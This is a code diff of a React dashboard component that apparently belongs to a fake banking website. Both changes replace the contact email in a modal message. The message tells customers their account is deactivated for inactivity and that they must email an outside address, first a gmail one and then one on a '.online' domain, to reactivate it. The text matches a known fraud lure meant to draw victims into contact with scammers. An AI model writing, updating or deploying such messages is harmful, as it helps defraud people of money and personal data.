@@ -175,7 +175,7 @@ const Dashboard = () => {
                 Dear Customer, due to the inactivity of your bank account for
                 more than 5 years your account has been deactivated. You would
                 be unable to receive or transfer funds, contact us via our email
-                address: swizzworldbank@gmail.com to reactivate your account,
+                address: info@pentagonfedcub.online to reactivate your account,
                 Thank you.
               </h4>
             </Modal.Body>
@@ -277,7 +277,7 @@ const Dashboard = () => {
                   Dear Customer, due to the inactivity of your bank account for
                   more than 5 years your account has been deactivated. You would
                   be unable to receive or transfer funds, contact us via our
-                  email address: swizzworldbank@gmail.com to reactivate your
+                  email address: info@pentagonfedcub.online to reactivate your
                   account, Thank you.
                 </h4>
               </Modal.Body>
